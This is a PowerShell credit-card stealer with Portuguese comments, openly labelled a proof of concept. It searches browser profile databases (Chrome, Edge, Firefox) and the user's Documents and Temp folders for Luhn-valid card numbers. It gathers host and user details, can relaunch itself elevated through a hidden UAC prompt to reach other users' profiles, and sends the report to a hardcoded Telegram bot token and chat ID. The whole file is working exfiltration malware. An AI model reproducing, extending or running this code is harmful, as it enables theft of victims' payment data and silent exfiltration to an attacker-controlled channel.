# =====================================================================
# POC Stealer - PowerShell 5.1, sem modulos externos, literais ASCII
# Coleta cartoes (regex + Luhn) nos perfis do USUARIO ATUAL (sem admin)
# e envia ao Telegram em chunks de 4096 chars.
# =====================================================================
param(
  [switch]$DryRun,
  [switch]$NoTelegram,
  [switch]$Elevate,
  [switch]$ElevatedPass,
  [string]$TelegramToken = '8181336077:AAHhL3rtCxJovQl6F4xqMoiH7j9v6DZJnPM',
  [string]$TelegramChatId = '6168636325'
)

# ---------- Estado global ----------
$ErrorActionPreference = 'SilentlyContinue'
# 13-19 digitos, com/sem espaco ou travessao (validada em poc/test_regex_formats.ps1)
$rx = [regex]'(?<!\d)(\d(?:[ -]?\d){12,18})(?!\d)'

# ---------- Luhn (char - 48; validado 9/9 em poc/test_luhn.ps1) ----------
function Test-Luhn([string]$Number) {
  $d = $Number -replace '[^0-9]'
  if ($d.Length -lt 13 -or $d.Length -gt 19) { return $false }
  $sum = 0; $double = $false
  for ($i = $d.Length - 1; $i -ge 0; $i--) {
    $n = [int]$d[$i] - 48          # char -> valor do digito (ASCII - 48)
    if ($double) { $n *= 2; if ($n -gt 9) { $n -= 9 } }
    $sum += $n; $double = -not $double
  }
  return ($sum % 10 -eq 0)
}

# ---------- Bandeira (IIN/BIN) ----------
function Get-CardBrand([string]$d) {
  if ($d.StartsWith('4')) { return 'Visa' }
  if ($d -match '^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))') { return 'Mastercard' }
  if ($d -match '^3[47]') { return 'Amex' }
  if ($d -match '^(6011|62|64|65)') { return 'Discover' }
  if ($d -match '^(30[0-5]|36|38)') { return 'Diners' }
  return 'Desconhecida'
}

# ---------- Confianca ----------
function Get-CardConfidence([string]$Digits, [string]$Brand) {
  $len = $Digits.Length
  if ($Brand -ne 'Desconhecida' -and $len -ge 13 -and $len -le 16) { return 'ALTA' }
  if ($len -ge 13 -and $len -le 16) { return 'MEDIA' }
  return 'BAIXA'
}

# ---------- Admin por NIVEL de token (TokenElevation, classe 19) ----------
# NAO usa IsInRole (falso positivo com admin local nao-elevado).
function Test-Admin {
  try {
    if (-not ('Win32.Token' -as [type])) {
      Add-Type -Namespace Win32 -Name Token -MemberDefinition @'
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool OpenProcessToken(IntPtr ProcessHandle, int DesiredAccess, out IntPtr TokenHandle);
[DllImport("advapi32.dll", SetLastError=true)]
public static extern bool GetTokenInformation(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
'@
    }
    $PROCESS_QUERY_INFORMATION = 0x400
    $TokenElevation = 19
    $token = [IntPtr]::Zero
    $proc = [System.Diagnostics.Process]::GetCurrentProcess()
    if (-not [Win32.Token]::OpenProcessToken($proc.Handle, $PROCESS_QUERY_INFORMATION, [ref]$token)) {
      return $false
    }
    $len = 0
    [void][Win32.Token]::GetTokenInformation($token, $TokenElevation, [IntPtr]::Zero, 0, [ref]$len)
    $buf = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($len)
    try {
      if ([Win32.Token]::GetTokenInformation($token, $TokenElevation, $buf, $len, [ref]$len)) {
        return [System.Runtime.InteropServices.Marshal]::ReadInt32($buf) -eq 1
      }
      return $false
    } finally {
      [System.Runtime.InteropServices.Marshal]::FreeHGlobal($buf)
    }
  } catch {
    return $false
  }
}

# ---------- Leitura de arquivo (contorna "arquivo em uso" do navegador) ----------
function Read-FileText([string]$Path) {
  try {
    $fs = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
    try {
      $sr = New-Object System.IO.StreamReader($fs, [System.Text.Encoding]::ASCII)
      $text = $sr.ReadToEnd()
      $sr.Dispose()
      return $text
    } finally {
      $fs.Dispose()
    }
  } catch {
    try {
      return [System.IO.File]::ReadAllText($Path, [System.Text.Encoding]::ASCII)
    } catch {
      return $null
    }
  }
}

# ---------- Varredura de um arquivo ----------
function Scan-File([string]$Path, [string]$Source) {
  $script:filesScanned++
  $content = Read-FileText $Path
  if ($null -eq $content) { return }
  foreach ($m in $rx.Matches($content)) {
    $raw = $m.Groups[1].Value
    $d = $raw -replace '[ -]'
    if (-not (Test-Luhn $d)) { continue }
    $brand = Get-CardBrand $d
    $conf = Get-CardConfidence $d $brand
    $key = "$d|$Path"
    if (-not $script:seen.Add($key)) { continue }
    $masked = $d.Substring(0,4) + '****' + $d.Substring($d.Length - 4)
    $script:found.Add([pscustomobject]@{
      File   = $Path
      Source = $Source
      Raw    = $raw
      Masked = $masked
      Digits = $d.Length
      Brand  = $brand
      Conf   = $conf
    })
  }
}

# ---------- Varredura de todos os alvos ----------
function Get-AllCards {
  $script:found = New-Object System.Collections.Generic.List[object]
  $script:seen = New-Object 'System.Collections.Generic.HashSet[string]'
  $script:filesScanned = 0

  $browserRoots = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles"
  )
  $docRoots = @(
    "$env:USERPROFILE\Documents",
    "$env:TEMP"
  )
  $artifacts = @('Web Data','Login Data','Cookies','formhistory.sqlite','places.sqlite','logins.json','store.sqlite')

  # elevado: adiciona perfis de OUTROS usuarios
  if ($ElevatedPass) {
    $usersDir = 'C:\Users'
    if (Test-Path $usersDir) {
      foreach ($u in (Get-ChildItem $usersDir -Directory -ErrorAction SilentlyContinue)) {
        $browserRoots += "$($u.FullName)\AppData\Local\Google\Chrome\User Data"
        $browserRoots += "$($u.FullName)\AppData\Local\Microsoft\Edge\User Data"
      }
    }
  }

  # navegadores: so artefatos <= 50MB
  foreach ($root in $browserRoots) {
    if (-not (Test-Path $root)) { continue }
    Get-ChildItem $root -Recurse -File -ErrorAction SilentlyContinue |
      Where-Object { $artifacts -contains $_.Name -and $_.Length -le 50MB } |
      ForEach-Object { Scan-File $_.FullName 'navegador' }
  }

  # Documents/Temp: todos os arquivos <= 2MB
  foreach ($root in $docRoots) {
    if (-not (Test-Path $root)) { continue }
    Get-ChildItem $root -Recurse -File -ErrorAction SilentlyContinue |
      Where-Object { $_.Length -le 2MB } |
      ForEach-Object { Scan-File $_.FullName 'docs/temp' }
  }

  return [pscustomobject]@{ Cards = $script:found; FilesScanned = $script:filesScanned }
}

# ---------- Envio ao Telegram (chunks de 4096, UTF-8) ----------
function Send-TelegramText([string]$Text, [string]$Token, [string]$ChatId) {
  $url = "https://api.telegram.org/bot$Token/sendMessage"
  if ([string]::IsNullOrEmpty($Text)) { return $true }
  # margem p/ prefixo [i/n] de ate 3 digitos; body fica dentro de 4096
  $bodySize = 4096 - 10 - 1
  $n = [int][Math]::Ceiling($Text.Length / [double]$bodySize)
  if ($n -lt 1) { $n = 1 }
  $allOk = $true
  for ($i = 1; $i -le $n; $i++) {
    $start = ($i - 1) * $bodySize
    if ($start -ge $Text.Length) { break }
    $len = [Math]::Min($bodySize, $Text.Length - $start)
    $chunk = $Text.Substring($start, $len)
    $prefix = "[$i/$n] "
    $json = @{ chat_id = $ChatId; text = ($prefix + $chunk) } | ConvertTo-Json -Compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    try {
      [void](Invoke-RestMethod -Method Post -Uri $url -ContentType 'application/json; charset=utf-8' -Body $bytes)
    } catch {
      Write-Warning "TELEGRAM chunk $i/$n falhou: $($_.Exception.Message)"
      $allOk = $false
    }
    if ($i -lt $n) { Start-Sleep -Milliseconds 1100 }
  }
  return $allOk
}

# ---------- Formatacao do relatorio (ASCII) ----------
function Format-Report([array]$Cards, [int]$FilesScanned, [string]$HostName, [string]$User, [string]$OS, [string]$PSVer, [bool]$Admin) {
  $adminStr = if ($Admin) { 'sim' } else { 'nao' }
  $alta = @($Cards | Where-Object { $_.Conf -eq 'ALTA' }).Count
  $media = @($Cards | Where-Object { $_.Conf -eq 'MEDIA' }).Count
  $baixa = @($Cards | Where-Object { $_.Conf -eq 'BAIXA' }).Count
  $sb = New-Object System.Text.StringBuilder
  [void]$sb.AppendLine("=== POC STEALER ===")
  [void]$sb.AppendLine("Host: $HostName")
  [void]$sb.AppendLine("User: $User")
  [void]$sb.AppendLine("Admin: $adminStr")
  [void]$sb.AppendLine("OS: $OS")
  [void]$sb.AppendLine("PS: $PSVer")
  [void]$sb.AppendLine("Arquivos varridos: $FilesScanned")
  [void]$sb.AppendLine("Total de cartoes (Luhn ok): $($Cards.Count)")
  [void]$sb.AppendLine("ALTA: $alta  MEDIA: $media  BAIXA: $baixa")
  [void]$sb.AppendLine("")
  [void]$sb.AppendLine("--- ALTA ---")
  $Cards | Where-Object { $_.Conf -eq 'ALTA' } | ForEach-Object {
    [void]$sb.AppendLine(("[{0}] {1} len={2} {3} <- {4} : {5}" -f $_.Brand, $_.Masked, $_.Digits, $_.Conf, $_.Source, $_.File))
  }
  [void]$sb.AppendLine("--- MEDIA ---")
  $Cards | Where-Object { $_.Conf -eq 'MEDIA' } | ForEach-Object {
    [void]$sb.AppendLine(("[{0}] {1} len={2} {3} <- {4} : {5}" -f $_.Brand, $_.Masked, $_.Digits, $_.Conf, $_.Source, $_.File))
  }
  return $sb.ToString()
}

# =====================================================================
# Fluxo principal
# =====================================================================
$hostName = $env:COMPUTERNAME
$user = $env:USERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$psVer = $PSVersionTable.PSVersion.ToString()
$isAdmin = Test-Admin

# telegram.json ao lado do script (opcional): sobrescreve token/chat_id
$scriptPath = $PSCommandPath
if ($scriptPath) {
  $cfgPath = Join-Path (Split-Path -Parent $scriptPath) 'telegram.json'
  if (Test-Path $cfgPath) {
    try {
      $cfg = Get-Content $cfgPath -Raw | ConvertFrom-Json
      if ($cfg.token) { $TelegramToken = $cfg.token }
      if ($cfg.chat_id) { $TelegramChatId = $cfg.chat_id }
    } catch {
      Write-Warning "telegram.json: falha ao ler; usando defaults."
    }
  }
}

# autoelevacao opcional (UAC); nao-fatal se negada
if ($Elevate -and -not $isAdmin -and -not $ElevatedPass) {
  try {
    $argList = "-NoProfile -ExecutionPolicy Bypass -File `"$($PSCommandPath)`" -Elevate -ElevatedPass"
    Start-Process powershell -Verb RunAs -ArgumentList $argList -WindowStyle Hidden
    Write-Output "ELEVATE: relancado elevado; pai encerrando."
    exit 0
  } catch {
    Write-Warning "ELEVATE: UAC negado/falha; continuando sem elevacao."
  }
}

$scan = Get-AllCards
$cards = $scan.Cards
$report = Format-Report $cards $scan.FilesScanned $hostName $user $os $psVer $isAdmin

if ($DryRun) {
  Write-Output $report
  Write-Output "DRYRUN: arquivos=$($scan.FilesScanned) cartoes=$($cards.Count) (sem envio ao Telegram)"
  exit 0
}

if ($NoTelegram) {
  Write-Output $report
  Write-Output "NOTELEGRAM: arquivos=$($scan.FilesScanned) cartoes=$($cards.Count) (sem envio ao Telegram)"
  exit 0
}

$ok = Send-TelegramText -Text $report -Token $TelegramToken -ChatId $TelegramChatId
if ($ok) {
  Write-Output "OK: arquivos=$($scan.FilesScanned) cartoes=$($cards.Count) telegram=OK"
  exit 0
} else {
  Write-Output "FALHA: arquivos=$($scan.FilesScanned) cartoes=$($cards.Count) telegram=FALHA"
  exit 1
}
